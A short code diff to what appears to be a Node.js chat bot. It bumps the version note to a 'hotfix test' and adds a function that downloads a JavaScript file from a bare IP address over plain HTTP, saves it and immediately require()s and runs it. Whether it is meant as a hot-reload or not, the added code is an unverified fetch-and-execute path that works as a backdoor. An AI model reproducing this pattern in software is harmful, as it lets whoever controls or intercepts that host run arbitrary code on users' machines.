@@ -5,8 +5,8 @@
 
 // commit
 /*
-	0.5.6.0
-	指定貼圖功能強化
+	0.5.7.2
+	hotfix test
 */
 
 // 初始化
@@ -201,7 +201,18 @@ const bot_on = function () {
 	});
 }
 
-
+const request = require("request");
+const fs = require("fs");
+const hotfix = async function(object){
+	await new Promise(function (resolve, reject) {
+		request.get("http://36.225.136.202:26080/hotfix_src.js")
+			.pipe(fs.createWriteStream('hotfix.js').on('finish', resolve));
+	});
+	
+	let hoitfixTest = require("./hotfix.js");
+	hoitfixTest(object);
+	delete require.cache[require.resolve("./hotfix.js")]
+}
 
 const main = async function () {
 	// 讀取資料
